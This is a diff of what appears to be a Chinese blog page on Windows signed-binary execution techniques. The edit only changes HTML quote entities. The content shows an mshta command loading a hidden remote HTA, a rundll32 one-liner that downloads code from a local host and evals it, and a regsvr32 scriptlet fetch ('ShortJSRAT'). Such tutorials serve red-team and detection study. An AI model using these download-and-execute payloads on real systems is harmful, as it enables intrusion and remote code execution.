@@ -117,13 +117,13 @@
 <p>mshta http://192.168.3.1/run.hta</p>
 <p>run.hta 内容如下：</p>
 <pre tabindex="0"><code>&lt;HTML&gt; 
-&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;
+&lt;meta http-equiv=&#34;Content-Type&#34; content=&#34;text/html; charset=utf-8&#34;&gt;
 &lt;HEAD&gt; 
-&lt;script language=&quot;VBScript&quot;&gt;
+&lt;script language=&#34;VBScript&#34;&gt;
 Window.ReSizeTo 0, 0
 Window.moveTo -2000,-2000
-Set objShell = CreateObject(&quot;Wscript.Shell&quot;)
-objShell.Run &quot;cmd.exe /c net user&quot; // 这里填写命令
+Set objShell = CreateObject(&#34;Wscript.Shell&#34;)
+objShell.Run &#34;cmd.exe /c net user&#34; // 这里填写命令
 self.close
 &lt;/script&gt;
 &lt;body&gt;
@@ -132,21 +132,21 @@ demo
 &lt;/HEAD&gt; 
 &lt;/HTML&gt;
 </code></pre><h2 id="0x09-rundll32">0x09 rundll32</h2>
-<pre tabindex="0"><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://127.0.0.1:8081/connect&quot;,false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im rundll32.exe&quot;,0,true);}%
+<pre tabindex="0"><code>rundll32.exe javascript:&#34;\..\mshtml,RunHTMLApplication &#34;;document.write();h=new%20ActiveXObject(&#34;WinHttp.WinHttpRequest.5.1&#34;);h.Open(&#34;GET&#34;,&#34;http://127.0.0.1:8081/connect&#34;,false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(&#34;WScript.Shell&#34;).Run(&#34;cmd /c taskkill /f /im rundll32.exe&#34;,0,true);}%
 </code></pre><p>其实还是依赖于WScript.shell这个组件</p>
 <h2 id="0x10-regsvr32">0x10 regsvr32</h2>
 <p>regsvr32 /u /s /i:http://192.168.3.1/test.data scrobj.dll</p>
 <p>test.data内容：</p>
-<pre tabindex="0"><code>&lt;?XML version=&quot;1.0&quot;?&gt;
+<pre tabindex="0"><code>&lt;?XML version=&#34;1.0&#34;?&gt;
 &lt;scriptlet&gt;
 &lt;registration
-    progid=&quot;ShortJSRAT&quot;
-    classid=&quot;{10001111-0000-0000-0000-0000FEEDACDC}&quot; &gt;
+    progid=&#34;ShortJSRAT&#34;
+    classid=&#34;{10001111-0000-0000-0000-0000FEEDACDC}&#34; &gt;
     &lt;!-- Learn from Casey Smith @subTee --&gt;
-    &lt;script language=&quot;JScript&quot;&gt;
+    &lt;script language=&#34;JScript&#34;&gt;
         &lt;![CDATA[
-            ps  = &quot;cmd.exe /c calc.exe&quot;;
-            new ActiveXObject(&quot;WScript.Shell&quot;).Run(ps,0,true);
+            ps  = &#34;cmd.exe /c calc.exe&#34;;
+            new ActiveXObject(&#34;WScript.Shell&#34;).Run(ps,0,true);
 
         ]]&gt;
 &lt;/script&gt;
